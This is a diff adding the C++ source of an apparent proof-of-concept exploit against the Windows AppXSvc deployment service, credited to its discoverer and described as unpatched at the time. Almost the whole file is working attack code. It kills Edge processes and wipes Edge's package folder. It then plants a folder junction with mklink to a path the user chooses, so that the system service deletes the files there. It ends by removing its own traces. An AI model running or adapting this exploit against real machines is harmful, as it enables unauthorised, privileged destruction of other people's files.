@@ -1,0 +1,244 @@
+/*
+# Author : Abdelhamid Naceri
+# Discovered On : 13/08/2019
+# Description : An Elevation Of Privileges Exist when the microsoft AppXSvc
+Deployment Service Cannot Properly Handle The Folder Junction lead to an arbitrary file deletion
+from a low integrity user .
+# Still Unpatched On 13/08/2019
+Here Is A Demo Video https://youtu.be/jqYwMcNvTtM
+*/
+#include"windows.h"
+#include"iostream"
+#include"conio.h"
+#include"stdio.h"
+#include"tlhelp32.h"
+#include"cstdio"
+#include"wchar.h"
+#include"process.h"
+#include"wchar.h"
+#include"string"
+#include"tchar.h"
+
+#pragma warning(disable : 4996)
+#pragma comment(lib, "advapi32.lib")
+#ifndef UNICODE  
+typedef std::string String;
+#else
+typedef std::wstring String;
+#endif
+
+using namespace std;
+
+bool FileExists(const wchar_t* file) {
+	if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(file) && GetLastError() == ERROR_FILE_NOT_FOUND)
+	{
+		return false;
+	}
+	else {
+		return true;
+	}
+}
+
+void remove_dir(const wchar_t* folder)
+{
+	std::wstring search_path = std::wstring(folder) + _T("/*.*");
+	std::wstring s_p = std::wstring(folder) + _T("/");
+	WIN32_FIND_DATA fd;
+	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
+	if (hFind != INVALID_HANDLE_VALUE) {
+		do {
+			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+				if (wcscmp(fd.cFileName, _T(".")) != 0 && wcscmp(fd.cFileName, _T("..")) != 0)
+				{
+					remove_dir((wchar_t*)(s_p + fd.cFileName).c_str());
+				}
+			}
+			else {
+				DeleteFile((s_p + fd.cFileName).c_str());
+			}
+		} while (::FindNextFile(hFind, &fd));
+		::FindClose(hFind);
+		_wrmdir(folder);
+	}
+}
+
+void killProcessByName(const wchar_t* filename)
+{
+	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+	PROCESSENTRY32 pEntry;
+	pEntry.dwSize = sizeof(pEntry);
+	BOOL hRes = Process32First(hSnapShot, &pEntry);
+	while (hRes)
+	{
+		if (wcscmp(pEntry.szExeFile, filename) == 0)
+		{
+			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
+				(DWORD)pEntry.th32ProcessID);
+			if (hProcess != NULL)
+			{
+				TerminateProcess(hProcess, 9);
+				CloseHandle(hProcess);
+			}
+		}
+		hRes = Process32Next(hSnapShot, &pEntry);
+	}
+	CloseHandle(hSnapShot);
+}
+
+bool IsProcessRunning(const wchar_t* processName)
+{
+	bool exists = false;
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	if (Process32First(snapshot, &entry))
+		while (Process32Next(snapshot, &entry))
+			if (!_wcsicmp(entry.szExeFile, processName))
+				exists = true;
+
+	CloseHandle(snapshot);
+	return exists;
+}
+
+bool dirExists(const std::string& dirName_in)
+{
+	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
+	if (ftyp == INVALID_FILE_ATTRIBUTES)
+		return false;
+
+	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
+		return true;
+
+	return false;
+}
+
+void KillEdge()
+{
+	killProcessByName(L"MicrosoftEdge.exe");
+}
+
+void StartEdge() 
+{
+	try
+	{
+		system("start microsoft-edge:");
+	}
+	catch (...){}
+}
+
+void exploit(const char* path) {
+	//Inintializing the variable before begining
+	int attempt = 0;
+	string command;
+	wchar_t* userprofile = _wgetenv(L"USERPROFILE");
+	const wchar_t* relpath = (L"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe");
+	//I created roaming path variable because sometime when i try to wipe ms-edge folder he deny the access so as a solution
+	//I deleted him first
+	const wchar_t* roamingpath = (L"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\RoamingState");
+	wstring froamingpath(userprofile);
+	froamingpath += wstring(roamingpath);
+	wstring fullpath(userprofile);
+	fullpath += std::wstring(relpath);
+	wchar_t* szBuffsrc = (wchar_t*)fullpath.c_str();
+	wstring fpath(szBuffsrc);
+	string strfpath(fpath.begin(), fpath.end());
+	//Check If MS-Edge Need To Write DACL Or Not
+
+	if (dirExists(strfpath) != true) { 
+		printf("[!] Wait MS-Edge Need To Write The DACL");
+		StartEdge();
+		for (;;) {
+			Sleep(1000);
+			if (IsProcessRunning(L"MicrosoftEdge.exe") == true) { break; }
+		}
+		StartEdge();
+		Sleep(7000);
+		KillEdge();
+		printf("\r                                      ");
+	
+	}
+
+	//End Of Check
+	printf("\r# Author : Abdelhamid Naceri\n");
+	printf("# Tested On Windows 10 32&64bit\n");
+	printf("# Description : A Vulnerabilitie Exist On Microsoft AppXSvc Deployement Service (\"wsappx\") Could Allow An Attacker To Arbitratry Delete Any File Exist On A Windows Machine\n");
+	printf("[+] Checking If Path Exist ...");
+	Sleep(2000);
+	if (dirExists(path) != true) { 
+		printf("Your Path Is Invalid"); 
+		ExitProcess(EXIT_FAILURE); }
+	else { 
+		printf("Exist !\n");
+		KillEdge();
+		printf("[+] Starting MS-Edge ...\n");
+		StartEdge();
+		Sleep(4000);
+		printf("[+] Killing MS-Edge ...\n");
+		KillEdge();
+		Sleep(3000);
+		printf("[+] Wipping MS-Edge Directory ...\n");
+		killProcessByName(L"dllhost.exe");//I Kill This Process Because Somethime He Lock The Files
+		remove_dir(roamingpath);
+		remove_dir(szBuffsrc);
+		Sleep(2000);
+		remove_dir(szBuffsrc);
+		printf("[+] Checking If Directory Exist Anymore ...");
+		if (dirExists(strfpath) == true) {
+			
+			if (dirExists(strfpath) == true) {
+				printf("Something Went Wrong");
+				printf("\n[!] You Should Delete The Files YourSelf Press Anything To Continue");
+				command = "explorer ";
+				command.append(strfpath);
+				system(command.c_str());
+				_getch();
+				goto Continue;
+			}
+		}
+		else {
+Continue:
+			printf(" Done\n");
+			Sleep(3000);
+			printf("[+] Attempting to Create Junction To Target ...\n");
+			command = "mklink /J ";
+			command.append("\"");
+			command.append(strfpath);
+			command.append("\"");
+			command.append(" ");
+			command.append("\"");
+			command.append(path);
+			command.append("\"");
+			system(command.c_str());
+			printf("Done\n");
+			Sleep(3000);
+			printf("[+] Firing Up MS-Edge Again ...\n");
+			StartEdge();
+			do { Sleep(1000);  } while (IsProcessRunning(L"MicrosoftEdge.exe"));
+			Sleep(3000);
+			StartEdge();
+			command = "explorer ";
+			command.append(path);
+			printf("[!] If The Exploit Done , MS AppXSvc Will Wipe The Target Path\n");
+			system(command.c_str());
+			printf("[!] We Will Open Explorer In The Target Check Your Files If The File Deleted Press Anything To Clear The Exploit Files...\n");
+			_getch();
+			printf("Cleaning ...");
+			_wremove(szBuffsrc);
+			_wrmdir(szBuffsrc);
+			ExitProcess(EXIT_SUCCESS);
+		}
+	}
+}
+
+int main(int argc, char* argv[]) {
+	if (argc == 2) {exploit(argv[1]);}
+	else { 
+		printf("# Author : Abdelhamid Naceri\n");
+		printf("# Tested On Windows 10 1903 32&64bit\n");
+		printf("# Description : A Vulnerabilitie Exist On Microsoft AppXSvc Deployement Service (\"wsappx\") Could Allow An Attacker To Arbitratry Delete Any File Exist On A Windows Machine\n");
+		printf("[!] Usage : poc.exe TargetPath");
+	}
+	return EXIT_SUCCESS;
+}
